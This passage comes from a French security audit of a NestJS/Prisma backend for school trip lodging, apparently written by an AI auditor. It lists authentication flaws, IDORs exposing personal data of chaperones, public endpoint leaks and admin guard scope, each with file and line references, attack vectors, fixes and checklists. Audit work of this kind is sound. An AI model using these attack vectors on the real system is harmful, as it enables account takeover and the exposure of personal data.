1. Le **token magic** (UUID) circule dans l'**URL GET** : il est susceptible d'apparaître dans les
   logs d'accès (reverse-proxy/Scalingo), l'en-tête `Referer` si la page `/auth/magic` charge une
   ressource tierce, et l'historique. Combiné au **TTL de 7 jours**, la fenêtre de fuite est large.
2. La consommation **élève `compteValide` à true** : pour un compte dormant de rôle HEBERGEUR, cela
   **court-circuiterait la validation admin** (gate `login` `COMPTE_EN_ATTENTE_VALIDATION`,
   `auth.service.ts:543`). **INCERTAIN** : à confirmer qu'aucun magic link n'est émis vers un
   hébergeur non validé (sinon bypass de la validation manuelle).

**Vecteur d'attaque (menace b).** Un magic link fuité **avant** consommation (transfert d'email,
log proxy, partage d'écran) et **dans les 7 jours** → l'attaquant ouvre l'URL, obtient un JWT, et
via B2 définit un mot de passe → **prise de contrôle complète** du compte dormant (qui peut porter
des données séjour / mineurs selon le rôle).

**Fix recommandé.**
1. **Réduire le TTL** du magic link (ex. 15–60 min, comme un lien de connexion à usage immédiat).
2. Éviter le token en clair dans le path GET : préférer un POST avec token en body, ou au minimum
   garantir `Referrer-Policy: no-referrer` (cf. checklist) et purger ces URLs des logs.
3. Ne **pas** forcer `compteValide:true` aveuglément : ne lever que `emailVerifie`, et conserver la
   validation admin pour HEBERGEUR. Estimation : **0,5–1 j**.

---

### B4. MOYENNE — `reset-password` et `verify-email` sans `@Throttle` dédié ; incohérence de robustesse vs `login`

**FAIT.**
- `POST /auth/reset-password` (`auth.controller.ts:87-90`) : **aucun `@Throttle`**.
- `POST /auth/verify-email/:token` (`auth.controller.ts:50-54`) : **aucun `@Throttle`**.
- `POST /auth/login` est throttlé 5/min (`auth.controller.ts:74-76`) ; `forgot-password` 5/h
  (81-82) ; `renvoyer-magic-link` 3/h (62-64). Le **contraste** confirme l'oubli volontaire/non
  sur reset/verify.
- Robustesse du token : `reinitialiserMotDePasse` (`auth.service.ts:622-630`) résout le token via
  `findFirst({ resetPasswordToken: token, resetPasswordExpires: { gt: now } })` — **UUID v4**,
  **expiration 1 h** (`auth.service.ts:598`). `verifyEmail` (`auth.service.ts:407-423`) : UUID v4,
  expiration 24 h (`auth.service.ts:421`).
- Comparaison des tokens : faite **en base** via `where` Prisma (égalité SQL), pas de `===` en
  mémoire → la question « comparaison à temps constant » est **sans objet** ici (pas de secret
  comparé byte-à-byte côté Node ; le seul `bcrypt.compare` du login est déjà constant-time).

**INTERPRÉTATION.** Le brute-force d'un token reset/verify est **non réaliste** : 122 bits + fenêtre
courte (1 h / 24 h) + throttle **global** 60/min/IP qui s'applique malgré l'absence de `@Throttle`
local. Le risque résiduel est surtout un **abus de volume** (énumération/spam) sur ces routes non
limitées spécifiquement, et l'incohérence défensive.

**Fix recommandé.** Ajouter `@Throttle` sur `reset-password` (ex. 5/15 min) et `verify-email`
(ex. 10/h) par cohérence et défense en profondeur. Estimation : **0,25 j**.

---

### B5. MOYENNE — `forgot-password` : pas d'énumération ; mais `login` divulgue l'existence/état d'un compte (user enumeration)

**FAIT — pas d'énumération sur les flux dédiés.**
- `demanderResetPassword` (`auth.service.ts:589-595`) renvoie **toujours** « Si cet email existe… »
  (même si l'user n'existe pas). `resendVerification` (471) et `renvoyerMagicLink` (496-498) idem.
  **Bonne pratique respectée.**

**FAIT — fuite via `login`.** `login()` renvoie des messages **distincts selon l'état du compte** :
`COMPTE_DORMANT` (`auth.service.ts:528`, compte existant sans mot de passe), `EMAIL_NON_VERIFIE`
(537), `COMPTE_EN_ATTENTE_VALIDATION` (544) — versus `Identifiants invalides` (522,533) quand l'user
n'existe pas ou que le mot de passe est faux. Un attaquant peut donc **distinguer** un email
inexistant d'un compte dormant/non vérifié/hébergeur-en-attente → **énumération d'utilisateurs** et
profilage d'état, malgré l'effort d'anti-énumération ailleurs.

**INTERPRÉTATION.** Sévérité MOYENNE : utile à un attaquant pour cibler (phishing « votre compte est
en attente », bourrage de credentials ciblé). Le throttle login 5/min limite le débit mais pas la
fuite par requête.

**Fix recommandé.** Conserver les codes d'état pour le **frontend** uniquement après un mot de passe
**valide** ; tant que les identifiants ne sont pas prouvés, renvoyer un message générique. Au
minimum, ne pas distinguer « email inconnu » de « compte existant non finalisé » avant validation du
mot de passe. Estimation : **0,5 j** (revue UX + messages).

---

### B6. MOYENNE — Auto-validation `compteValide:true` des rôles auto-enregistrables (ORGANISATEUR/SIGNATAIRE) → munition pour les IDOR de la Section A

**FAIT.**
- `registerOrganisateur` (`auth.service.ts:80`) et `registerSignataire` (`auth.service.ts:152`)
  posent **`compteValide:true`** d'emblée ; seul `emailVerifie` (vérification email) reste requis
  pour passer le `login`. Aucune validation humaine.
- Conséquence : **n'importe qui peut obtenir un compte `SIGNATAIRE` valide** (email jetable
  vérifiable) en self-service.

**INTERPRÉTATION / lien Section A.** Ce rôle `SIGNATAIRE` auto-obtenu est précisément le rôle qui,
faute de contrôle d'ownership, ouvre les IDOR **A1** (dossier médical de tout séjour CONVENTION),
**A2** (`/sejours/:id/detail`), **A3** (`dossier-pedagogique`) et **A5** (`comparatif`, IBAN/SIRET).
B6 est donc le **maillon d'amorçage** : il transforme « il faut être SIGNATAIRE » en « il suffit de
s'inscrire ». La gravité réelle de B6 est portée par les findings A correspondants.

**Fix recommandé.** Soit modérer la création de comptes SIGNATAIRE (validation/invitation
obligatoire), soit — surtout — **corriger l'ownership** côté A1/A2/A3/A5 pour que le rôle seul ne
donne aucun accès transversal. Estimation : couverte par les fixes Section A ; côté auth, exiger
une `invitationToken` **vérifiée** pour SIGNATAIRE (cf. B8) : **0,5 j**.

---

### B7. BASSE — Incohérences cryptographiques : rounds bcrypt (12 vs 10) et politique de mot de passe (min 6 vs 8, sans complexité)

**FAIT.**
- bcrypt **rounds = 12** dans `register`/`registerOrganisateur`/`registerSignataire`/
  `registerHebergeur` (`auth.service.ts:39,65,138,214`), mais **rounds = 10** dans
  `reinitialiserMotDePasse` (632) et `definirMotDePasse` (714). Un mot de passe défini via reset ou
  set-password est donc **moins coûteux à casser** hors-ligne.
- Politique de longueur : `MinLength(8)` à l'inscription (`register*.dto.ts`) et `definirMotDePasse`
  (`auth.service.ts:711`), mais **`MinLength(6)`** dans `LoginDto` (`login.dto.ts:8`) — incohérent
  (sans impact direct : le login compare). **Aucune règle de complexité** (majuscule/chiffre/
  symbole) nulle part.

**INTERPRÉTATION.** Pas exploitable directement, mais affaiblit la résistance au brute-force
hors-ligne en cas de fuite de la table `User`. Défense en profondeur.

**Fix recommandé.** Uniformiser à **rounds ≥ 12** partout ; remonter `LoginDto` à 8 ; ajouter une
règle de complexité minimale (longueur 10–12 + zxcvbn ou regex). Estimation : **0,25 j**.

---

### B8. HAUTE — `registerSignataire` : rattachement à une `Organisation` arbitraire via `organisationId` du body, sans vérifier l'invitation

**FAIT.**
- `RegisterSignataireDto` expose **`organisationId?` et `invitationToken?`** en champs libres
  (`register-signataire.dto.ts:43-48`).
- `registerSignataire` (`auth.service.ts:159-167`) : `if (dto.organisationId)` crée **directement**
  un `Membership` `role:'MEMBRE', isPrimary:true` sur **l'organisation fournie dans le body**, via
  `findOrCreateMembership` — **sans vérifier que `invitationToken` est valide ni qu'il correspond à
  cette organisation**.
- L'`invitationToken` n'est utilisé que pour un `updateMany({ where:{ token, utilisedAt:null }},
  { utilisedAt: now }).catch(()=>{})` (`auth.service.ts:170-175`) : **best-effort, non bloquant**,
  et **découplé** de la création du membership. Si le token est absent/invalide, le membership est
  **quand même** créé.

**Vecteur d'attaque (menace c — pivot d'accès).**
1. L'attaquant s'inscrit `POST /auth/register/signataire` avec
   `{ ..., "organisationId":"<UUID de l'établissement cible>" }` (UUID fuitable via les payloads
   d'autres endpoints — cf. Section A — ou deviné/obtenu).
2. Il devient **`MEMBRE` de l'organisation cible** sans aucune invitation valide.

**INTERPRÉTATION / INCERTAIN.** L'**impact** dépend de la façon dont la couche
`Organisation`/`Membership` est consommée pour autoriser l'accès aux centres/séjours (helpers
`getCentreForUser`, permissions). Si un `Membership MEMBRE` confère un accès en lecture aux
ressources de l'organisation, c'est une **élévation d'accès cross-organisation** (HAUTE). À vérifier
en traçant l'usage de `Membership` dans les guards/services métier — **non entièrement tranché ici**,
d'où le marquage INCERTAIN sur la portée, FAIT sur l'auto-rattachement.

**Fix recommandé.** Lier le membership à la **validation effective** de l'`invitationToken` :
résoudre l'invitation, vérifier `utilisedAt:null` **et** que son `organisationId` == `dto.organisationId`,
**dans une transaction** ; refuser sinon. Ne jamais faire confiance à un `organisationId` brut du
body. Estimation : **0,5 j**.

---

### Checklist — NON VÉRIFIABLE DEPUIS LE CODE (pour Théo) — Section B

- [ ] **`POST /auth/register` est-il réellement atteignable en prod ?** (pas de filtrage WAF/proxy
  en amont qui le bloquerait). Même si l'UI ne l'utilise pas, vérifier qu'il n'est pas exposé — cf. B0.
- [ ] **Effet exact de `refuserHebergeur`** (`admin.service.ts`) : suppression de l'user vs
  `compteValide:false` ? Détermine si un JWT existant survit à la suspension (B1).
- [ ] **En-têtes déployés** (Scalingo / reverse-proxy) : `Referrer-Policy: no-referrer` (limite la
  fuite du token magic via `Referer` — B3), HSTS, CSP (limite l'exfiltration de JWT par XSS — B1/B2).
- [ ] **Stockage du JWT côté frontend** : cookie `httpOnly/Secure/SameSite` vs `localStorage`
  (CLAUDE.md mentionne « JWT depuis cookie `token` » côté axios, mais `consommerMagicLink` le passe
  en fragment `#token=`). À confirmer : le JWT finit-il en `localStorage` (exposé XSS) ? — impact B1/B2.
- [ ] **Logs d'accès** (Scalingo/proxy) : les chemins `GET /auth/magic/:token`, `verify-email/:token`,
  `reset-password/...` sont-ils journalisés avec leur token ? (fuite — B3/B4).
- [ ] **Rotation/robustesse de `JWT_SECRET`** côté env Scalingo (longueur, secret unique par env).
- [ ] **Usage métier d'un `Membership MEMBRE`** : confère-t-il un accès en lecture aux séjours/centres
  de l'organisation ? Tranche la sévérité réelle de B8.

---

### Tableau récapitulatif — Section B

| # | Vulnérabilité | `fichier:ligne` | Menace | Sévérité | Fix (estim.) |
|---|---|---|---|---|---|
| B0 | Anonyme → **ADMIN** : `role` en mass assignment dans `RegisterDto` + JWT émis sans contrôle | `register.dto.ts:28-30` ; `auth.service.ts:48,53` ; `auth.controller.ts:19` | a | **CRITIQUE** | Retirer `role`, ne pas émettre de JWT (0,25 j) |
| B1 | JWT 7 j, pas de révocation, `validate()` ne check ni `compteValide` ni version | `auth.module.ts:18` ; `jwt.strategy.ts:26-33` | b/c | **CRITIQUE** | TTL court + refresh/`tokenVersion` (1–2 j) |
| B2 | `set-password` sans ré-auth : tout JWT (re)définit le mot de passe | `auth.controller.ts:92-97` ; `auth.service.ts:710-720` | b/c | HAUTE | Exiger ancien MDP / limiter au 1ᵉʳ set (0,5 j) |
| B8 | `registerSignataire` rattache à une `organisationId` arbitraire sans invitation valide | `auth.service.ts:159-175` ; `register-signataire.dto.ts:43-48` | c | HAUTE | Lier membership à l'invitation vérifiée (0,5 j) |
| B3 | Magic link TTL 7 j, token dans URL GET, force `compteValide:true` | `auth.service.ts:656-665,675,681` ; `auth.controller.ts:69` | b | HAUTE | TTL court + ne pas forcer `compteValide` (0,5–1 j) |
| B4 | `reset-password`/`verify-email` sans `@Throttle` dédié | `auth.controller.ts:50-54,87-90` | a | MOYENNE | Ajouter `@Throttle` (0,25 j) |
| B5 | `login` divulgue l'état du compte (user enumeration) | `auth.service.ts:528,537,544` | a | MOYENNE | Messages génériques avant auth (0,5 j) |
| B6 | Auto-`compteValide:true` SIGNATAIRE/ORGANISATEUR → amorce les IDOR Section A | `auth.service.ts:80,152` | a | MOYENNE | Invitation requise + fixes A (0,5 j) |
| B7 | bcrypt 10 vs 12 ; MDP min 6 (login) / 8, sans complexité | `auth.service.ts:632,714` ; `login.dto.ts:8` | — | BASSE | Uniformiser rounds ≥12 + complexité (0,25 j) |

**Atténuations confirmées :** tokens UUID v4 (122 bits) ; throttle global 60/min ; magic link à
usage unique ; `forgot-password`/`resend`/`renvoyer-magic-link` anti-énumération ; JWT magic en
fragment (`#`) non loggé serveur ; `JWT_SECRET` obligatoire.
**Priorité de remédiation Section B : B0 (immédiat) → B1 → B2/B8 → B3 → B4/B5/B6 → B7.**
**B0 prime sur l'ensemble des findings A : c'est un chemin anonyme direct vers ADMIN.**

---

## Section C — Endpoints publics, admin, isolation multi-tenant (auditeur : Claude, lecture seule)

**Méthodologie.** Inventaire des 27 `@Controller` (`grep` croisé avec `@UseGuards`/`@Roles`/
`@RequirePermission`/`@Public`). Lecture intégrale de `public/` (controller + service), `admin/`
(controller), `auth/guards/permission.guard.ts`, `centres/permission.helper.ts`,
`centres/centre.helper.ts`, `sequence/`, des endpoints `facture/`, et des contrôleurs/services
sans guard ou centre-scopés. Chaque point distingue **FAIT** / **INTERPRÉTATION** / **INCERTAIN**.
Threat model : **un hébergeur du centre A qui veut atteindre des données du centre B, ou des
endpoints qui ne le regardent pas.**

**Périmètre — ce qui n'est PAS re-listé ici.** Les IDOR par rôle (SIGNATAIRE cross-établissement,
HEBERGEUR cross-demande) et la **famille financière facture N8–N11** (`getFacturesForDevis`,
`validerAcompte`, `getChorusXml`, `downloadPdf`) sont déjà inventoriés dans
`docs/audits/REMEDIATION_IDOR_ANALYSE.md`. **Confirmation de lecture (répond à leur Q6) :**
`ajouterVersement`/`supprimerVersement` (`facture.service.ts:780,821`) sont **bien protégés** via
`chargerFactureProprietaire` (`:756-766`, check `facture.devis.centreId !== centreId → Forbidden`) ;
en revanche `getFacturesForDevis` (`:740`, `findMany{where:{devisId}}`), `getFactureById` (`:138`,
`findUnique{where:{id}}`), `getChorusXml` (`:897`) et `validerAcompte` (`:853`) **ne filtrent
toujours pas** — conforme à N8–N11. Non re-traités ici.

---

### C0. FAIT rassurant — Isolation multi-centre : le header `X-Centre-Id` n'est PAS cru aveuglément (menace #3 fermée pour le pivot)

**FAIT.** Les deux points de résolution du centre actif valident le lien réel user↔centre :
- `getCentreForUser` (`centres/centre.helper.ts:9-24`) : avec un `centreId`, charge le centre,
  exige `statut === 'ACTIVE'`, puis renvoie le centre **uniquement si** `centre.userId === userId`
  (propriétaire, `:16`) **ou** s'il existe un `CollaborateurCentre` avec `acceptedAt != null`
  (`:19-22`) ; sinon `ForbiddenException('Ce centre ne vous appartient pas')` (`:24`).
- `getUserCentrePermissions` (`centres/permission.helper.ts:34-42`) : même logique (owner →
  `OWNER_PERMISSIONS` ; collaborateur accepté → permissions stockées ; sinon `null` → 403).

**INTERPRÉTATION.** Le scénario « hébergeur 2 centres qui force `X-Centre-Id` vers un 3ᵉ centre »
**échoue** : le header est une *demande*, pas une *preuve*. Tout `centreId` sans lien réel est
rejeté (403/404). L'isolation multi-tenant repose donc sur la donnée serveur, pas sur le header
client. **C'est correct.**

**LIMITE (le vrai trou).** `PermissionGuard` renvoie `true` quand `@RequirePermission` est absent
(`auth/guards/permission.guard.ts:19-20`). La sécurité d'un endpoint centre-scopé **sans**
`@RequirePermission` dépend alors **entièrement** du service appelant `getCentreForUser`.
**Vérifié OK** : `abonnements` (`abonnement.controller.ts`, service via `getCentreForUser`),
`activites-client` (`activites-client.service.ts:43,50` → `getCentreForUser` + check
`client.centreId === centre.id`), `clients` (`@RequirePermission('crm')`). **Vérifié NON-filtré** :
les seuls endpoints centre-scopés qui ne passent ni par `@RequirePermission` ni par
`getCentreForUser` sont les lectures facture **N8–N11** (déjà documentées ailleurs). Aucun nouveau
trou d'isolation centre au-delà de N8–N11.

---

### C1. HAUTE — IDOR `GET /accompagnateurs/sejour/:sejourId` : liste les accompagnateurs (PII adultes) de n'importe quel séjour

**FAIT.** `accompagnateurs/accompagnateur.controller.ts:44-49` :
`@Roles(ORGANISATEUR, SIGNATAIRE, AUTORITE, HEBERGEUR)`, `getBySejour(@Param('sejourId'))` — **le
`user` n'est pas transmis**. Service `accompagnateur.service.ts:83-88` :
`findMany({ where: { sejourId }, orderBy: … })` — **`findMany` sans `select`**, donc renvoie le
modèle `AccompagnateurMission` complet (prénom, nom, **email**, téléphone, `diplome`,
`contactUrgenceNom`/`contactUrgenceTel`, `signatureNom`, `tokenAcces`…). **Aucun contrôle
d'ownership** (ni établissement, ni centre, ni créateur du séjour).

**Vecteur d'attaque (menace : hébergeur/SIGNATAIRE quelconque).** `GET /accompagnateurs/sejour/{sejourId}`
pour un `sejourId` arbitraire (UUID v4, non devinable mais fuitable via logs/partage/autres
payloads) → **liste nominative des accompagnateurs** d'un séjour d'un autre établissement, avec
emails, téléphones et **`tokenAcces`** (qui, exposé, ouvre le flux public de signature, cf. C3).

**INTERPRÉTATION.** Non couvert par `REMEDIATION_IDOR_ANALYSE.md` (qui traite séjour-detail,
dossier-pédagogique, demande, devis, facture, collaboration — **pas** cet endpoint). PII d'adultes
encadrant des mineurs + fuite du `tokenAcces` = sévérité HAUTE.

**Fix recommandé.** Transmettre `@CurrentUser()` et appliquer la règle d'ownership du séjour
(réutiliser R1/`assertSignataireCanAccessSejour` du doc IDOR pour SIGNATAIRE ; `createurId === user.id`
pour ORGANISATEUR ; lien hébergement sélectionné pour HEBERGEUR). Retirer `tokenAcces` du payload
(jamais nécessaire à l'affichage liste). Estimation : **0,5 j**.

---

### C2. MOYENNE — IDOR `GET /accompagnateurs/:id/ordre-mission-pdf` : ordre de mission de n'importe quel accompagnateur

**FAIT.** `accompagnateur.controller.ts:67-72` : `@Roles(ORGANISATEUR, SIGNATAIRE)`,
`getOrdreMissionPdf(@Param('id'))` — `user` non transmis. Service `getOrdreMissionHtml(id)`
(`accompagnateur.service.ts:174-192`) : `findUnique({ where: { id } })` **sans ownership**. Renvoie
l'HTML complet de l'ordre de mission : accompagnateur (nom, prénom), séjour, **coordonnées de
l'établissement** (`orgaCreateur` : nom, adresse, ville, UAI, email, téléphone — via
`getByToken`/`getOrdreMissionHtml`), nom de l'enseignant créateur.

**Vecteur d'attaque.** Tout ORGANISATEUR/SIGNATAIRE : itère sur un `id` d'accompagnateur (UUID) →
document nominatif + contacts établissement d'autrui.

**Fix.** Même correctif que C1 (passer `user`, vérifier ownership du séjour rattaché). Estim. : **0,5 j**.

---

### C3. MOYENNE — Flux public `accompagnateurs/signer/:token` : token sans expiration ni invalidation (même classe que A6)

**FAIT.** `accompagnateur.controller.ts:52-64` :
- `GET /accompagnateurs/signer/:token` (`:52`) — **aucun guard**. `getByToken` (`service:90-149`)
  renvoie l'accompagnateur (nom, email) + séjour + **coordonnées établissement** (email, téléphone,
  adresse, UAI) + nom enseignant.
- `PATCH /accompagnateurs/signer/:token` (`:58`) — **aucun guard**. `signer` (`service:151-172`)
  bloque le re-signing (`if (signeeAt) Conflict`, `:160`) **mais le token n'expire jamais et n'est
  pas invalidé** après signature (toujours valide en lecture).

**FAIT — entropie.** `tokenAcces` = `@unique @default(uuid()) @db.Uuid` (`schema.prisma:396`) →
**UUID v4 robuste**, non énumérable ; throttle global 60/min.

**Vecteur d'attaque (lien fuité).** Un lien `/accompagnateurs/signer/<token>` transféré/fuité reste
exploitable à vie en lecture (PII accompagnateur + contacts établissement). Identique au pattern
**A6** (autorisations) mais sur l'entité `AccompagnateurMission`.

**Fix.** Ajouter un `tokenExpiresAt` (ex. `dateFin` séjour + 30 j) vérifié sur les deux routes ;
invalider/roter le token après signature. Estimation : **0,5 j + migration SQL** (colonne).

---

### C4. MOYENNE — `GET /public/centres` expose email/téléphone/SIRET de centres **non validés (PENDING)**, sans filtre de statut

**FAIT.** `public/public.controller.ts:22-26` : `GET /public/centres?search=` (public, throttle
30/min) → `centreService.searchPublic(search)`. `centres/centre.service.ts:627-658` : la requête
Prisma porte le **commentaire explicite « sans filtre de statut »** (`:633`) et **aucun
`where: { statut }`** (`:634-640`). Le `select` (`:641-655`) renvoie **`email`, `telephone`,
`siret`**, `adresse`, `codePostal`, `capacite`, `agrementEducationNationale`, en plus du `nom`/`ville`.
`take: 10` (`:656`).

**Vecteur d'attaque (menace : anonyme).** Recherche publique non authentifiée renvoyant les
coordonnées (email, téléphone) **et le SIRET** de **tous** les centres, **y compris ceux en statut
`PENDING`** — c.-à-d. des inscriptions hébergeurs **pas encore validées par l'admin** (données de
prospects/brouillons qui ne devraient pas être publiques). Énumération de masse possible en faisant
varier le terme `search` (10 résultats/requête, throttle 30/min ≈ jusqu'à ~300 fiches/min/IP).

**INTERPRÉTATION.** L'email/téléphone d'un centre **ACTIVE** publié au catalogue peut être un choix
produit assumé ; mais **exposer les centres `PENDING` + le `SIRET`** via une recherche anonyme
dépasse le besoin de l'autocomplete. Contraste avec `getPublic` (`:713`) qui, lui, ne filtre pas
non plus le statut mais exige l'UUID exact.

**Fix recommandé.** (1) Ajouter `where: { statut: 'ACTIVE' }` à `searchPublic`. (2) Retirer `siret`
(et idéalement `email`/`telephone` directs) du `select` public — exposer un canal de contact
indirect plutôt que l'email brut. Estimation : **0,25 j**.

---

### C5. MOYENNE — `POST /public/demande` : énumération d'utilisateurs, email bombing ciblé, création de masse, body `any` sans DTO

**FAIT.** `public/public.controller.ts:16-20` : `POST /public/demande`, throttle **5/min/IP**,
`@Body() body: any` — **aucun DTO, donc aucune validation `ValidationPipe`** (ni whitelist ni
typage ; rappel `main.ts:52`). Service `public.service.ts:87`.

1. **Énumération d'utilisateurs (FAIT).** `:91-95` : si `existant?.compteValide`, lève
   `ConflictException('Un compte existe déjà avec cet email…')`. Un attaquant apprend donc, email
   par email, lesquels correspondent à un **compte validé** (réponse 409 vs 200/201). Distinct de
   B5 (login) : ici sans même tenter de mot de passe.
2. **Création de masse / pollution (FAIT).** Chaque appel crée un `User`
   (`role:'ORGANISATEUR', compteValide:true`, `:108-110`) + un `Sejour` + une `DemandeDevis`
   (`:158-213`). 5/min/IP = jusqu'à 300 comptes+séjours/h/IP (botnet → davantage).
3. **Email bombing ciblé (FAIT).** `:216-227` envoie un magic link à l'**email fourni par
   l'attaquant** (harcèlement d'un tiers). `notifierCentresInscrits` (`:243-347`) envoie un email
   « nouvelle demande » à **de vrais centres** : soit le `centreDestinataireId` (UUID **contrôlé
   par l'attaquant**, `:252-263` → ciblage d'un centre précis), soit **tous** les centres `ACTIVE`
   d'une zone (`:266-346`). Permet d'inonder un centre ou une région de fausses demandes.
4. **Body non validé (FAIT).** `@Body() body: any` : le service *cherry-pick* les champs (donc pas
   de mass-assignment de `role`/`compteValide`, codés en dur), mais aucune borne de taille/type sur
   les champs libres (limite globale 5 Mo, `main.ts:13`).

**INTERPRÉTATION.** Aucun de ces points n'est une RCE/escalade, mais l'ensemble = surface d'abus
(spam, harcèlement par email, pollution DB, énumération). L'auto-validation `compteValide:true`
rejoint B6.

**Fix recommandé.** (1) Remplacer `body: any` par un **DTO class-validator** (réutiliser
`DemandePubliqueDto`). (2) Réponse **générique** à l'étape 1 (ne pas distinguer compte existant).
(3) CAPTCHA/anti-bot sur le formulaire public + throttle plus strict. (4) Ne notifier le
`centreDestinataireId` que s'il provient d'un contexte légitime, pas d'un UUID brut du body.
Estimation : **0,5–1 j**.

---

### C6. BASSE / INFO — `GET /hebergements` et `GET /hebergements/:id` publics (catalogue) — pas de fuite IBAN confirmée

**FAIT.** `hebergements/hebergement.controller.ts:14-22` : `GET /hebergements` (`search`) et
`GET /hebergements/:id` (`findById`) — **aucun guard** (publics). `findById`
(`hebergement.service.ts:184-189`) filtre `statut: 'ACTIVE'` puis `mapCentre(centre)`. `mapCentre`
(`:63-95`) projette un **`contact: c.telephone ?? c.email`** (`:94`) — **`iban` n'est PAS référencé**
dans `mapCentre` (vérifié). Pas de fuite d'IBAN par ce chemin.

**INTERPRÉTATION.** Endpoints de catalogue public (browse-to-quote) ; exposent un canal de contact
(téléphone/email) de centres **ACTIVE** uniquement — choix produit plausible. Contrairement à C4,
le statut est filtré et le SIRET/IBAN ne sont pas exposés. Risque faible ; signalé pour
exhaustivité (endpoints non authentifiés).

**Fix (optionnel).** Si le contact brut ne doit pas être public, le masquer derrière un formulaire
authentifié. Estimation : **0,25 j** si décidé.

---

### C7. INFO — Admin : périmètre de garde CONFORME ; impact d'une compromission ADMIN

**FAIT — garde.** `admin/admin.controller.ts:21-23` : `AdminController` porte
`@UseGuards(JwtAuthGuard, RolesGuard)` **+ `@Roles(Role.ADMIN)` au niveau classe** → **toutes** les
routes (`stats`, `hebergeurs`, `utilisateurs`, `centres`, `claims`, `invitations`, `sync-lmdj`,
`reseau/*`) en héritent. `ReseauController` (`:141-143`) : `@Roles(Role.RESEAU, Role.ADMIN)`.
**Aucune route admin sans garde.** **B0 confirmé corrigé** : `auth/dto/register.dto.ts` (relu
intégralement) ne contient **plus** de champ `role` (prenom, nom, email, password, telephone seuls).

**FAIT — pouvoirs ADMIN.** `PATCH /admin/utilisateurs/:id` accepte `{ role, compteValide }`
(`:56-59`) → **changer le rôle de n'importe quel compte** (création d'ADMIN, validation arbitraire) ;
`GET /admin/utilisateurs` → annuaire (emails) ; `valider/refuserHebergeur`, `activerCentre`,
`valider/refuserClaim`, `sync-lmdj` (import en masse), `creerInvitation`.

**INTERPRÉTATION — blast radius.** Un compte ADMIN compromis = contrôle total de l'identité
(rôles, validations) et des imports. Combiné à **B1** (JWT 7 j non révocable) et à l'absence
constatée de **MFA**/2FA dans le code d'auth (Section B), un vol de session ADMIN est durable.
Aucune trace d'un **journal d'audit** des actions admin dans le code (à confirmer — checklist).

**Fix recommandé (défense en profondeur).** (1) MFA obligatoire pour ADMIN. (2) Journal d'audit des
mutations admin (`updateUtilisateur`, validations). (3) `validate()` qui revérifie le rôle/état
(cf. B1). Estimation : **1–2 j** (hors B1).

---

### Checklist — NON VÉRIFIABLE DEPUIS LE CODE (pour Théo) — Section C

- [ ] **Statut réel des centres exposés par `/public/centres`** : combien de centres `PENDING`
  (inscriptions non validées) sont effectivement publiés en prod via cette recherche ? (impact C4).
- [ ] **CAPTCHA / anti-bot** en amont de `/public/demande` et des formulaires d'inscription
  (Cloudflare Turnstile, hCaptcha…) — non visible dans le code backend (impact C5).
- [ ] **Journal d'audit des actions admin** : existe-t-il une table/log des mutations
  (`updateUtilisateur`, `validerHebergeur`…) hors code applicatif ? (impact C7).
- [ ] **MFA/2FA pour les comptes ADMIN** : géré hors-code (SSO, proxy d'auth) ou absent ? (impact C7).
- [ ] **Réputation d'envoi Brevo** : un email bombing via `/public/demande` (magic link vers tiers,
  notifications centres) peut-il dégrader la délivrabilité du domaine ? (impact C5).

---

### Tableau récapitulatif — Section C

| # | Vulnérabilité | `fichier:ligne` | Menace | Sévérité | Fix (estim.) |
|---|---|---|---|---|---|
| C1 | IDOR `GET /accompagnateurs/sejour/:sejourId` : PII accompagnateurs + `tokenAcces` de tout séjour | `accompagnateur.controller.ts:44-49` ; `accompagnateur.service.ts:83-88` | hébergeur/SIG | **HAUTE** | Ownership séjour + retirer `tokenAcces` (0,5 j) |
| C2 | IDOR `GET /accompagnateurs/:id/ordre-mission-pdf` : ordre de mission d'autrui | `accompagnateur.controller.ts:67-72` ; `accompagnateur.service.ts:174-192` | ORG/SIG | MOYENNE | Ownership séjour (0,5 j) |
| C3 | Token public accompagnateur sans expiration/invalidation (classe A6) | `accompagnateur.controller.ts:52-64` ; `accompagnateur.service.ts:90,151` ; `schema.prisma:396` | lien fuité | MOYENNE | `tokenExpiresAt` + invalidation (0,5 j) |
| C4 | `GET /public/centres` expose email/tél/**SIRET** de centres **PENDING** (sans filtre statut) | `public.controller.ts:22-26` ; `centre.service.ts:627-658` | anonyme | MOYENNE | `where:{statut:'ACTIVE'}` + retirer SIRET (0,25 j) |
| C5 | `POST /public/demande` : énumération users + email bombing ciblé + création masse + body `any` | `public.controller.ts:16-20` ; `public.service.ts:87,91-95,216-227,243-347` | anonyme | MOYENNE | DTO + réponse générique + CAPTCHA (0,5–1 j) |
| C6 | `GET /hebergements(/:id)` publics — contact catalogue exposé (pas d'IBAN) | `hebergement.controller.ts:14-22` ; `hebergement.service.ts:184,63-94` | anonyme | BASSE | Masquer contact si non voulu (0,25 j) |
| C7 | Admin : garde CONFORME ; impact compromission (rôles, validations) sans MFA/audit | `admin.controller.ts:21-23,56-59,141-143` | ADMIN volé | INFO | MFA + audit log (1–2 j) |

**Faits rassurants confirmés (FAIT) :**
- **Isolation X-Centre-Id robuste (C0)** : `getCentreForUser` + `getUserCentrePermissions` valident
  le lien réel → **pas de pivot vers un 3ᵉ centre** par manipulation du header.
- **IDs séquentiels non exploitables (menace #4)** : les endpoints facture clés sur l'**UUID**
  (`:id`/`:devisId`), jamais sur le `numero` séquentiel ; aucun `getFactureByNumero` n'existe
  (`grep`) → **brute-force par numéro impossible**. Le risque résiduel facture = IDOR-par-UUID
  (N8–N11, déjà documenté ailleurs).
- **Admin entièrement gardé** (`@Roles(ADMIN)` niveau classe), **B0 corrigé**.
- **`/organisations/search` & `/public/organisations/search`** : proxys throttlés (30/min) de
  l'open-data SIRENE (`organisations.service.ts:72`) — aucune donnée interne, pas de SSRF (URL fixe).

**Priorité de remédiation Section C : C1 → C4/C5 → C2/C3 → C7 → C6.**

---

## Section D — Injection, XSS, uploads, dépendances, secrets (auditeur : Claude, lecture seule)

**Méthodologie.** Scans transverses (`grep`) puis lecture ciblée : `$queryRaw`/`$executeRaw`
(SQLi), `dangerouslySetInnerHTML` + `href={}`/`src={}` (XSS), composants PDF serveur (`<Image src>`,
SSRF), `FileInterceptor` + `storage.service.ts` (uploads), scan secrets sur tout le repo hors
`node_modules`, `useGlobalFilters`/`ExceptionFilter` (verbosité), `console.*` (logs). Chaque point
distingue **FAIT** / **INTERPRÉTATION** / **INCERTAIN**. Threat model : **j'injecte du contenu
(notes, journal, messages, nom de fichier, ligne de devis, URL de profil) réaffiché ou rendu en
PDF/email ; je cherche des secrets dans le repo.**

---

